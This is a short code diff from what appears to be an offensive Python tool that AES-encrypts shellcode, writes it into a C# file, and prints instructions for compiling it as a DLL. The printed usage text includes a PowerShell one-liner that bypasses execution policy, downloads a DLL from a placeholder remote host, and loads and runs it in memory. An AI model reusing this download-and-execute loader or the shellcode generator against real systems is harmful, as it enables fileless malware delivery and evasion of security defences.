@@ -1222,7 +1222,6 @@ dll=f'''
 
 
 #open("payload.cs", "w").write(dll)
-"""
 print("[*] Shellcode AES encrypted")
 print("[*] Shellcode written to .cs")
 print("[*] .cs file generated in current directory")
@@ -1233,4 +1232,3 @@ print("""[*] In VS, compile as a dll and then load from memory
 or remotely with:
 powershell -noexit -nop -ep bypass [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://x.x.x.x/run.dll'));[ClassName.Class1]::Main()
 """)
-"""
